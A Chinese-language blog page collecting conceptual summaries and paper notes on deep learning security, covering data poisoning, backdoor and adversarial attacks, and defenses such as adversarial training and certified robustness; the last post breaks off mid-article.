<p>深度学习中的模型特指神经网络，其是深度学习的核心，其特点在于数据驱动、自主学习，复制实现相应理论、算法，将数据喂给模型进行训练，得到最终的模型，实现预测功能。</p>
<p>数据之于深度学习，相当于燃料之于运载系统。训练模型时需要大量高质量的数据，模型从中自动学习隐含于数据中的高价值特征、规律，此外，高质量的模型还可以增加模型的鲁棒性和泛化能力。</p>
<p>承载系统包括实现深度学习时需要的算力、算法的代码实现、软件框架（如Pytorch,TensorFlow）等。</p>
<p>在研究深度学习系统安全性时，自然也应从这三面着手研究。</p>
<p>1）在模型层面来看，可以分为两方面研究，即训练过程和推理过程。在训练过程中，如果训练数据集受到恶意篡改，则可能会影响模型性能，这一阶段的攻击包括数据投毒攻击和后门攻击；在推理过程中，如果对输入的测试样本进行恶意篡改，则有可能欺骗模型使其做出错误决策，这一阶段的攻击主要为对抗样本攻击。此外正如我们在0x01提到的，由于缺乏解释性，加之模型架构复杂，在将其应用于复杂的现实场景时可能会产生不可预计的输出，这就涉及到模型的鲁棒性问题，比如下图所示，印在公交车上的董明珠像被行人闯红灯系统识别为闯红灯。当然这一点攻击者很难控制，这方面没有具体的攻击方案。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-research-on-explain-and-robustness/wpskMMPQU.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>2）从数据层面来看，也可以分为两个方面，即训练数据和模型的参数数据。针对训练数据，Yang等人的研究[32]表明，攻击者可以通过模型的输出结果（不同分类的置信度）等可以恢复出原始的训练数据，简单来说主要是因为模型的输出结果隐藏着训练集，测试集的相关属性，攻击者根据返回的置信度可以构建生成模型进而恢复原始数据，类似的攻击一般统称为成员推理攻击。针对模型的参数数据，Florin等人的研究[33]表明，在不清楚模型类型及训练数据分布的情况下，仅仅通过一定的模型查询次数，获得模型返回的信息（如对输入特征向量的预测、置信度等）就可以恢复出模型，窃取模型的参数。类似的攻击一般统称为模型提取攻击，或模型逆向攻击。</p>
<p>3）从承载系统层面来看，主要可以分类2种类型。一种是在软件框架方面，如Pytorch，TensorFlow等框架及其所调用的第三方API出现漏洞[34]，比如CVE-2020-15025，在使用Tensorflow提供的函数StringNGrams时，可能会泄露敏感信息，如返回地址，则攻击者可以通过泄露的信息构造攻击向量，绕过地址随机化，进而控制受害者的机器。另一种是在硬件层面，比如数据采集设备、服务器等，如果数据采集设备被攻击，则可能会导致数据投毒攻击，如果服务器被攻击，则相当于模型整个训练过程都暴露于攻击者手中，攻击者可能会趁机植入后门，进行后门攻击。</p>
<p>这里需要注意，本小节提到了多种攻击手段，如模型逆向、数据投毒、成员推理、后门攻击、对抗样本等，但是实际上关键的攻防发生在后门和对抗样本两个领域，其他的攻击手段往往会作为辅助进行应用。比如在黑盒情况下进行对抗样本攻击时可能就需要模型逆向的手段先生成一个足够近似的白盒模型，接着进行攻击。再比如绝大部分后门攻击都是通过数据投毒的手段实现的，不过不同的方案的假设不同，对数据集的数量大小、投毒比率等有差异。</p>
<p>限于篇幅，本小节这是粗略的介绍，在后续文章中，将会分别详细对后门和对抗样本两个领域的攻防展开。</p>
<p># 0x07参考</p>
<p>[1]https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%BC%8F%E8%AF%86%E5%88%AB</p>
<p>[2]https://zh.wikipedia.org/wiki/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0</p>
<p>[3] Ribeiro M T , Singh S , Guestrin C . "Why Should I Trust You?": Explaining the Predictions of Any Classifier[C]// Proceedings of the 2016 Conference of the North American Chapter of the Association for Computational Linguistics: Demonstrations. 2016.</p>
<p>[4]http://www.xinhuanet.com/auto/2021-01/07/c_1126954442.htm</p>
<p>[5] Lauritsen S M , Kristensen M , Olsen M V , et al. Explainable artificial intelligence model to predict acute critical illness from electronic health records[J]. Nature Communications, 2020, 11(1).</p>
<p>[6]Jiménez-Luna, José, Grisoni F , Schneider G . Drug discovery with explainable artificial intelligence[J]. Nature Machine Intelligence.</p>
<p>[7]https://aaai.org/Conferences/AAAI-19/aaai19tutorials/</p>
<p>[8]https://www.darpa.mil/program/explainable-artificial-intelligence</p>
<p>[9] Zeiler M D , Fergus R . Visualizing and Understanding Convolutional Networks[C]// European Conference on Computer Vision. Springer, Cham, 2014.</p>
<p>[10]Poulin B, Eisner R, Szafron D, et al. Visual explanation of evidence with additive classifiers [C] //Proc of the 18th Conf on Innovative Applications of Artificial Intelligence. Palo Alto, CA: AAAI Press, 2006: 1822-1829</p>
<p>[11] Kononenko I. An efficient explanation of individual classifications using game theory [J]. Journal of Machine Learning Research, 2010, 11(Jan): 1-18</p>
<p>[12]Huysmans J, Dejaeger K, Mues C, et al. An empirical evaluation of the comprehensibility of decision table, tree and rule based predictive models [J]. Decision Support Systems, 2011, 51(1): 141-154</p>
<p>[13] Poulin B , Eisner R , Szafron D , et al. Visual explanation of evidence in additive classifiers[C]// Conference on Innovative Applications of Artificial Intelligence. AAAI Press, 2006.</p>
<p>[14]Xu K, Ba J, Kiros R, et al. Show, attend and tell: Neural image caption generation with visual attention [C] //Proc of the 32nd Int Conf on Machine Learning. Tahoe City, CA: International Machine Learning Society, 2015: 2048-2057</p>
<p>[15] Yang C , Rangarajan A , Ranka S . Global Model Interpretation via Recursive Partitioning[C]// 2018 IEEE 20th International Conference on High Performance Computing and Communications; IEEE 16th International Conference on Smart City; IEEE 4th International Conference on Data Science and Systems (HPCC/SmartCity/DSS). IEEE, 2018.</p>
<p>[16] Frosst N , Hinton G . Distilling a Neural Network Into a Soft Decision Tree[J]. 2017.</p>
<p>[17] Simonyan K , Vedaldi A , Zisserman A . Deep Inside Convolutional Networks: Visualising Image Classification Models and Saliency Maps[J]. Computer ence, 2013.</p>
<p>[18] Li J , Monroe W , Jurafsky D . Understanding Neural Networks through Representation Erasure[J]. 2016.</p>
<p>[19]Marco Tulio Ribeiro, Sameer Singh, and Carlos Guestrin. 2018. Anchors: High-precision model-agnostic explana-tions. InProceedings of the 32nd AAAI Conference on Artificial Intelligence (AAAI’18).</p>
<p>[20] Du M, Liu N, Song Q, et al. Towards explanation of dnn-based prediction with guided feature inversion[C]//Proceedings of the 24th ACM SIGKDD International Conference on Knowledge Discovery &amp; Data Mining. 2018: 1358-1367.</p>
<p>[21]Goodfellow I J, Shlens J, Szegedy C. Explaining and harnessing adversarial examples [J]. arXiv preprint arXiv:1412.6572, 2014</p>
<p>[22]Papernot N, Mcdaniel P, Jha S, et al. The limitations of deep learning in adversarial settings [C] //Proc of the 1st IEEE European Symp on Security and Privacy. Piscataway, NJ: IEEE, 2016: 372-387</p>
<p>[23] Papernot N, Mcdaniel P, Goodfellow I, et al. Practical black- box attacks against machine learning [C] //Proc of the 12th ACM Asia Conf on Computer and Communications Security. New York: ACM, 2017: 506-519</p>
<p>[24]吴亚丽, 李国婷, 付玉龙, 王晓鹏. 基于自适应鲁棒性的入侵检测模型. 控制与决策, 2019, 34(11): 2330-2336.</p>
<p>[25]Huang X, Kwiatkowska M, Wang S, et al. Safety verification of deep neural networks[C]. International Conference on Computer Aided Verification, 2017: 3-29.</p>
<p>[26]Tjeng V, Xiao K, Tedrake R. Evaluating robustness of neural networks with mixed integer programming[J]. arXiv preprint arXiv:1711.07356, 2017.</p>
<p>[27]Bunel R R, Turkaslan I, Torr P, et al. A unified view of piecewise linear neural network verification[C]. Advances in Neural Information Processing Systems, 2018: 4790-4799.</p>
<p>[28]Salman H, Li J, Razenshteyn I, et al. Provably robust deep learning via adversarially trained smoothed classifiers[C]. Advances in Neural Information Processing Systems, 2019: 11289-11300.</p>
<p>[29]Gowal S, Dvijotham K D, Stanforth R, et al. Scalable Verified Training for Provably Robust Image Classification[C]. Proceedings of the IEEE International Conference on Computer Vision, 2019: 4842-4851.</p>
<p>[30]Sunaga T. Theory of an interval algebra and its application to numerical analysis[J]. RAAG memoirs, 1958, 2(29-46): 209.</p>
<p>[31]纪守领, 李进锋, 杜天宇,等. 机器学习模型可解释性方法、应用与安全研究综述[J]. 计算机研究与发展, 2019, 56(10).</p>
<p>[32]Ziqi Yang, Jiyi Zhang, Ee-Chien Chang, and Zhenkai Liang. Neural network in- version in adversarial setting via background knowledge alignment. In Lorenzo Cavallaro, Johannes Kinder, XiaoFeng Wang, and Jonathan Katz, editors, Pro- ceedings of the 2019 ACM SIGSAC Conference on Computer and Communica- tions Security, CCS 2019, London, UK, November 11-15, 2019, pages 225–240. ACM, 2019.</p>
<p>[33]Florian Tramèr, Zhang F , Juels A , et al. Stealing Machine Learning Models via Prediction APIs[J]. 2016.</p>
<p>[34]https://www.anquanke.com/post/id/218839</p>
<p><strong>本文首发于安全客</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/29/0924-PaperNotes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Elwood's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/09/29/0924-PaperNotes/" itemprop="url">0924_PaperNotes</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-09-29T20:49:34+08:00">
                2021-09-29
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index">
                    <span itemprop="name">AI</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="what-doesnt-kill-you-makes-you-robuster--adversarial-training-against-poisons-and-backdoors-arxiv2021">What Doesn’t Kill You Makes You Robust(er)- Adversarial Training against Poisons and Backdoors-Arxiv2021</h1>
<p>目前对数据投毒的防御容易被各种自适应攻击adaptive attack绕过，这些防御方案要么会降低测试性能，要么无法推广到各种数据投毒威胁模型。对抗训练及其变体，目前被认为是对抗攻击经验防御中最有效的防御方案。本文用对抗训练来防御数据投毒和后门攻击。在训练期间生成毒化样本，使网络对毒化样本不再敏感，并将其注入training batch中。成功防御了feature collisons,gradient matching,backdoor triggers和hidden trigger backdoors。</p>
<p>现有的防御方案有三个主要缺点：</p>
<p>1.为了获得鲁棒性，在test accuracy上做了权衡，这对于现实世界中的用户是难以接受的</p>
<p>2.只对特定攻击方案有效，对于专门设计规避该方案的adaptive attack无效</p>
<p>3.没有一个普遍适用的框架</p>
<p>作者提出了训练对抗的变种，使用对抗性毒化数据来代替对抗样本。该方案不仅提高了鲁棒性和准确率，同时可以防御各类投毒攻击和后门攻击。</p>
<p>对抗训练使用实时制作的对抗样本来增强训练数据，使神经网络对测试阶段输入的对抗扰动脱敏，类似地，作者修改训练数据，使神经网络对毒化数据引起的扰动不敏感。但是该方案有其他需要考虑的地方，比如为了模拟定向数据投毒，我们必须决定在训练期间如何选择target。</p>
<p>数据投毒影响可用性，后门攻击影响完整性。</p>
<p>本文关注完整性的攻击。</p>
<p>可用性攻击，在部署阶段就能会检测，而完整性攻击则在模型中植入不容易被检测到的后门，在被部署后被攻击。</p>
<p>完整性攻击可以根据触发机制的性质trigger mechanism进一步分类：</p>
<p>1.backdoor trigger attacks：攻击由特定的触发器pattern或patch触发，只要将其在测试阶段添加到测试样本即可</p>
<p>2.targeted data poisoning:攻击由预定先的trageted image触发。</p>
<p>相比而言，前者可以应用于大量的target images,但是需要在推理期间对测试样本进行修改，而后者只能被特定的、但是不需修改的target激活</p>
<p>攻击也可以根据它们预期受害者使用的精确的training setup来分类，一些攻击假设受害者只会在毒化数据上fine-tune它们的模型，或者会在预训练的feature extractor上训练一个线性分类器。还有些攻击假设受害者在毒化数据上从头开始训练模型。一般而言，受害者的训练流程越简单，攻击者的工作就越容易。</p>
<p>数据毒化攻击的防御方案可以大体上分为：</p>
<p>Filter defense:试图检测、删除或者净化恶意的训练数据</p>
<p>robust training:使用一个训练过程，即使在毒化数据上也能训练出鲁棒模型</p>
<p>model repair:在毒化数据上训练模型，并在训练完成后修复模型</p>
<p>第一种容易部署因为只需要简单加一个预处理步骤，但是需要大量的超参数调优，并且依赖于假设“只有一小部分数据集被污染”，此外该方案也可以被adaptive attack绕过；此外在移除恶意数据后只能在少量数据上进行训练，所以降低模型的性能</p>
<p>......</p>
<h1 id="a-synergetic-attack-against-neural-network-classifiers-combining-backdoor-and-adversarial-examplesarxiv">A Synergetic Attack against Neural Network Classifiers combining Backdoor and Adversarial Examples（Arxiv）</h1>
<p>是<strong>TROJANS AND ADVERSARIAL EXAMPLES: A LETHAL COMBINATION</strong>修改后的版本</p>
<p>同时结合对抗攻击和后门攻击，实现所谓的AdvTrojan，其具有较好的隐蔽性，因为只有满足以下情况才能被激活：1.在推理阶段，在输入样本中注入特定的对抗性扰动(对抗扰动+后门触发器)；2.在训练阶段，植入后门。</p>
<p>如果在推理阶段，只有单独的对抗扰动或者单独的触发器时是不会导致误分类的。相当于，触发器将样本推到输入空间中靠近模型决策边界的任意位置，然后加上对抗扰动，将样本推到决策边界另一边，实现攻击。</p>
<h1 id="advdoor-adversarial-backdoor-attack-of-deep-learning-systemissta2021">AdvDoor: Adversarial Backdoor Attack of Deep Learning System（ISSTA2021)</h1>
<p>现有的后门攻击使用patch来毒化数据，容易被检测，本文利用定向通用对抗扰动(targeted universial adversarial perturbation)作为触发器，该方法可以利用<strong>训练数据的分布降低异常</strong>（如下图所示）并混淆现有的检测方法。改进现有的对抗攻击方法生成TUAP，并通过数据投毒构建毒化模型</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/0924-PaperNotes/image-20210924110914693.png" alt="image-20210924110914693" /><figcaption aria-hidden="true">image-20210924110914693</figcaption>
</figure>
<p>现有的攻击使用patch trigger,但是它们与数据或者attack class无关，添加这种触发器可能会导致数据分布异常，如上图b。patch trigger 不会影响source class的样本的关键特征，因此DNN在识别source class时仍保持高置信度，在DNN看来，此时的毒化数据仍然是远离target class的分类区域的，所以需要改变决策边界来拟合，这就会导致DNN的决策边界与之前的边界显著不同，而作者设计的触发器，可以缩短毒化数据与target class区域间的距离，减少数据集分布的异常，而对抗攻击可以将样本从原始分类区域移动到目标分类区域，扰动较小，所以可以用对抗攻击技术实现该目标。使用对抗攻击生成的TUAP作为触发器，此时的毒化数据可以接近或者跨越source class和target class之间的决策边界，如图a中的红点所示，当在这些数据集上进行训练时，决策边界需要调整的幅度更少，由此降低了异常。与patch trigger相比，TUAP是利用数据集的信息生成的，可以将有毒数据伪装成正常数据，现有的后门攻击防御方案很难检测。</p>
<p>那么现在还有个问题，现有的对抗攻击技术生成的扰动是特定于输入的，而后门攻击需要有一个固定的触发器，或者说一个固定的扰动。<strong>对现有的方法改进后就可以生成通用扰动</strong>。DNN倾向于学习一个class的通用特征，而通用扰动攻击这些特征，从而可以在大多数使用同样的一个扰动就实现误分类。</p>
<h1 id="adversarial-examples-are-useful-tooarriv2020">Adversarial examples are useful too!(Arriv2020)</h1>
<p>使用对抗样本检测后门攻击</p>
<p>使用FGSM等方案生成对抗样本，输入份额利器，通过计算不同类别图像的统计数据，将结果与参考模型reference model进行比较，就可能在视觉上定位受到扰动的区域并检测到攻击。</p>
<p>面临的问题是给定一个模型，怎么判断该模型是否有后门，作者的想法是：为毒化模型和原模型生成的对抗样本是不同的，利用这种差异就可以检测。</p>
<p>作者向模型输入空白图像、白噪声等图像，然后使用FGSM生对抗样本，然后计算被分类为某一类的对抗样本的平均值，进行比较，即使在MNIST上，对average adversarial images(bias maps）进行视觉检查也足以发现攻击了。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/0924-PaperNotes/image-20210924134126238.png" alt="image-20210924134126238" /><figcaption aria-hidden="true">image-20210924134126238</figcaption>
</figure>
<p>个人感觉不太靠谱，作者也没有给出理论解释。</p>
<h1 id="rab-provable-robustness-against-backdoor-attacksarxiv-2021">RAB: Provable Robustness Against Backdoor Attacks(arxiv 2021)</h1>
<p>在对抗攻击的防御方面，无论是empirical 还是provable robustness都有很多人研究，但是在后门攻击领域，还没有研究provable robustness的，本文首次提出统一框架进行鲁棒性验证，并且为后门攻击提出了严格的鲁棒性条件。并提出了第一个鲁棒训练过程，以平滑训练后的模型，并验证了其在面临后门攻击时的鲁棒性</p>
<p>这里需要搞清楚两点：</p>
<p>1.随机平滑是怎么提升模型鲁棒性的；</p>
<p>2.后门攻击的鲁棒性如何定义</p>
<p>对于第1点：</p>
<p>Cohen等人提出以高斯噪声平滑在<span class="math inline">\(l_2\)</span>范数下的强鲁棒性保证。在高层次上，随机平滑策略提供了一种方式验证一个平滑的分类器在测试阶段面对对抗样本的鲁棒性。首先给定一个平滑处理过的分类器（通过在每个测试样本周围添加高斯噪声；2.然后就可以得到top-1类pa的置信下界，和top-2类pb的置信上界之间的分类差距。对于每个测试样本，平滑后的分类器可以保证在扰动半径内提供一致的预测。</p>
<p>不过该方案没有关注后门攻击的鲁棒性，本文的目标是提供一个函数平滑框架来证明对抗攻击和后门攻击的鲁棒性，目前的方案是在测试样本层面增加噪声推导平滑，而作者提出的框架推广到分类器层面的平滑</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/28/survetonaa/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Elwood's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/09/28/survetonaa/" itemprop="url">naive review on adversarial attack</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-09-28T21:00:39+08:00">
                2021-09-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="前言">前言</h1>
<p>对于人工智能系统而言，对抗样本的存在是其面临最大的威胁之一，因为对抗样本仅需要针对模型生成特定扰动即可，而相比之下，数据投毒等攻击手段还需要攻击者可以控制训练集等，对攻击者的假设更强，在实际中对抗攻击是更容易出现的。本文试图对CV领域的对抗攻击技术做一个全面的介绍，首先会介绍重要的背景知识，包括距离度量、攻击者假设(攻击者知识、能力等)、对抗样本存在的本质原因以及对抗样本迁移性相关背景，之后会介绍一些典型的对抗攻击技术并给出实际攻击效果。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2021/09/28/survetonaa/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/27/defense4aa/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Elwood's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/09/27/defense4aa/" itemprop="url">Naive review on defense for AE</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-09-27T08:44:06+08:00">
                2021-09-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="前言">前言</h1>
<p>对抗攻击从2013年被Szegedy等人提出之后，截止目前，已经被研究的很深入了，相关文章也呈爆炸增长</p>
<img src="/2021/09/27/defense4aa/image-20210927100254076.png" class="">
<p>上图是发在arxiv上的有关对抗攻击的文章数量，该领域的火爆程度可见一斑。</p>
<p>现在如果这个时候要进入对抗攻击领域，可能需要往三条路去探索：1.寻找新的应用场景；2.设计的新的算法；3.研究如何规避已有防御方案。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2021/09/27/defense4aa/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/25/no-silver-bullet/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Elwood's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/09/25/no-silver-bullet/" itemprop="url">no-silver-bullet</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-09-25T09:06:05+08:00">
                2021-09-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="前言">前言</h1>
<p>银弹（英语：silver bullet）是一种由白银制成的子弹，有时也被称为银弹。在西方的宗教信仰和传说中作为一种武器，是唯一能和狼人、女巫及其他怪物对抗的利器。银色子弹也可用于比喻强而有力、一劳永逸地适应各种场合的解决方案。</p>
<p>计算机科班出身的同学在学习软件工程时，应该都看过或者听说过一本书：《人月神话》，这是软件工程领域的圣经，其中一篇收录的一篇论文名为《没有银弹：软件工程的本质性与附属性工作》，Brooks在其中引用了这个典故 ，说明在软件开发过程里是没有万能的终杀性武器的，只有各种方法综合运用，才是解决之道。而各种声称如何如何神奇的理论或方法，都不是能杀死“软件危机”这头狼人的银弹。此后，在软件界，银弹（Silver Bullet）成了一个通用的比拟流行开来。</p>
<p>在信息安全领域同样如此，也不存在银弹，没有万能、适用于各场景的技术。在工业界做安全永远是在追求trade-off，因为安全、效率和成本三者不可兼得；在学术界则需要兼顾安全和隐私两方面，如果一项技术没有全面经过全面考量，则可能带来更大的潜在风险。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2021/09/25/no-silver-bullet/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/23/OnTheTradeOff-NeurIPS2020/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Elwood's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/09/23/OnTheTradeOff-NeurIPS2020/" itemprop="url">OnTheTradeOff-NeurIPS2020</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-09-23T21:38:38+08:00">
                2021-09-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="abstract">Abstract</h1>
<p>DNN容易受到对抗攻击，也容易受到厚么攻击，这两类攻击之间的相互作用还没有被仔细研究。</p>
<p>本文通过实验研究对抗攻击对抗性和后门攻击鲁棒性之间是否会相互影响，并且证明，当网络对对抗攻击更具鲁棒性时，会更容易受到后门攻击，并分析了原因，介绍如何利用这种trade-off。</p>
<p>该研究表明未来的防御研究应该在设计算法或者鲁棒性时需要同时考虑对抗攻击、后门攻击，以避免虚假的安全感。</p>
<h1 id="introduction">Introduction</h1>
<p>应对对抗攻击的方案可以分为两类：基于经验的和基于实证的，对应着理论上的certified robustness,adversarial training</p>
<p>分别有：</p>
<p>[2,3,8,10–13,15,21,28,35,40–43]</p>
<p>[14,17,19,20,24,26,29,32,44]</p>
<p>应对后门攻击的方案可以作者没有归类，因为写本文的时候应在18，19年，但是后门攻击刚起来，对应的防御方案不多，作者举例子包括在训练前检测和删除毒化数据[6,36]，或者在训练后对模型进行微调以消除后门[30,39] 当时这些防御方案都是只针对一种类型的攻击设计的，对抗攻击和后门攻击之间的相互作用还没有被研究过。</p>
<p>对于攻击者可以同时操纵训练数据、测试数据的情况，了解两者之间的相互作用是至关重要的。</p>
<p>本文通过实验研究对抗鲁棒性和后门鲁棒性之间的相互影响</p>
<h1 id="related-works">Related works</h1>
<p>这里分别对对抗攻击和后门攻击做了简介。</p>
<p>作者这里提到的后门攻击是指通过数据投毒实现的后门攻击。这类后门攻击攻击有两种类型：dirty-label,clean-label，攻击者更喜欢后者，因为后者的标签是正确的，因此毒化数据更难被检测，但是clean-label攻击中的触发器在测试阶段要被添加到测试样本上，所以当前该类攻击都假设模型是由攻击者训练出来的，或者有个辅助模型，能够指出模型将会学习哪些特征并使用这些特征去增强触发器。</p>
<p>后门攻击的防御可以分为训练前防御和训练后防御，在训练后防御中，对已经植入后门的模型的潜在的触发器进行逆向工程，然后使用新创建的数据集对模型进行微调，在微调过程中，模型会发现触发器对做出正确预测毫无用户，于是就“忘记”了后门。</p>
<p>同时考虑两类攻击的工作还有【27】，【33】，前者指出数据投毒也可以用于降低模型的对抗鲁棒性，后者使用后门技术搭建蜜罐用于检测对抗攻击。</p>
<h1 id="the-trade-off-and-its-cause">The trade off and its cause</h1>
<p>对抗鲁棒性和后门鲁棒性不能同时轻易实现，因为存在trade-off</p>
<h2 id="experiments">Experiments</h2>
<p>分别在MNIST,CIFAR10，ImageNet上实验。</p>
<p>首先使用常规训练和对抗训练对相同架构进行实验，并比较其鲁棒性</p>
<p>为了评估模型的后门鲁棒性，作者设计了一种新的clean-label attack.（感觉就是普通的数据投毒攻击，根本不算clean-label）</p>
<p>评估指标：良性测试集上的准确性、对抗鲁棒性（PGD生成的对抗样本数据集上的准确性）、后门攻击的成功率(全部毒化测试样本中被模型分类到目标类的比率)</p>
<p>结果如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/OnTheTradeOff-NeurIPS2020.assets/image-20210923152143824.png" alt="image-20210923152143824" /><figcaption aria-hidden="true">image-20210923152143824</figcaption>
</figure>
<p>对比标准训练和对抗训练所在的行，可以看到提高对抗鲁棒性的同时降低了后门鲁棒性</p>
<p>除了对抗训练之外，还测试了另外两种对抗防御措施，即Lipschitz正则化[17]和特征去噪层[44]</p>
<p>从上图中可以看到，单独应用时无效，和对抗训练配合时才有效</p>
<p>另外对certified robustness defense做了实验，由于其不能扩展到非常深的网络和大型数据集，所以没有ImagetNet的</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/OnTheTradeOff-NeurIPS2020.assets/image-20210923153432302.png" alt="image-20210923153432302" /><figcaption aria-hidden="true">image-20210923153432302</figcaption>
</figure>
<p><strong>the cause</strong></p>
<p>为了理解为什么对抗鲁棒模型更容易受到后门攻击，作者使用了可视化技术研究模型学到了什么</p>
<figure>
